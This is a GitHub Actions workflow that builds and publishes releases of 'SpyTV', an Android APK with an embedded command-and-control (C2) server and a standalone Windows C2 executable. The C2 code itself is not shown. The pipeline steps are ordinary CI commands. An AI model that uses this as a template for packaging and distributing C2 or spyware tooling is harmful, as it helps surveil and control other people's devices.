name: Auto-Release on Version Bump

on:
  push:
    branches: [main]
    paths:
      - 'c2_server.py'
      - 'version.txt'

permissions:
  contents: write

jobs:
  check-version:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.version }}
      should_release: ${{ steps.version.outputs.should_release }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 2

      - name: Extract version
        id: version
        run: |
          VERSION=$(python -c "import re; m=re.search(r'\"version\":\s*\"([^\"]+)\"', open('c2_server.py').read()); print(m.group(1))")
          echo "version=$VERSION" >> $GITHUB_OUTPUT
          # Check if this version already has a release
          if gh release view "v$VERSION" >/dev/null 2>&1; then
            echo "should_release=false" >> $GITHUB_OUTPUT
            echo "Release v$VERSION already exists, skipping"
          else
            echo "should_release=true" >> $GITHUB_OUTPUT
            echo "New version v$VERSION detected, will release"
          fi
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  build-and-release:
    needs: check-version
    if: needs.check-version.outputs.should_release == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: 17

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Python dependencies
        run: pip install -r requirements.txt pyinstaller

      - name: Cache Gradle
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
            ~/.android
          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}

      - name: Download Android SDK
        uses: android-actions/setup-android@v3
        with:
          api-level: 34
          ndk: false
          cmake: false

      - name: Copy dashboard assets
        run: |
          mkdir -p android/app/src/main/assets
          cp c2_dashboard.html android/app/src/main/assets/

      - name: Build APK
        run: |
          chmod +x android/gradlew
          cd android
          ./gradlew assembleDebug --no-daemon --console=plain
          cp app/build/outputs/apk/debug/app-debug.apk ../SpyTV.apk

      - name: Build standalone EXE
        run: |
          pyinstaller --onefile --name "SpyTV-C2-standalone" \
            --add-data "c2_dashboard.html:." \
            --add-data "c2_data:c2_data" \
            --hidden-import "reportlab" \
            --hidden-import "yaml" \
            c2_server.py

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: v${{ needs.check-version.outputs.version }}
          name: SpyTV v${{ needs.check-version.outputs.version }}
          body: |
            ## SpyTV v${{ needs.check-version.outputs.version }}

            Automated release triggered by version bump.

            ### Assets
            - **SpyTV.apk** — Android application with embedded C2
            - **SpyTV-C2-standalone.exe** — Windows standalone C2 server
          files: |
            SpyTV.apk
            dist/SpyTV-C2-standalone*
          generate_release_notes: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
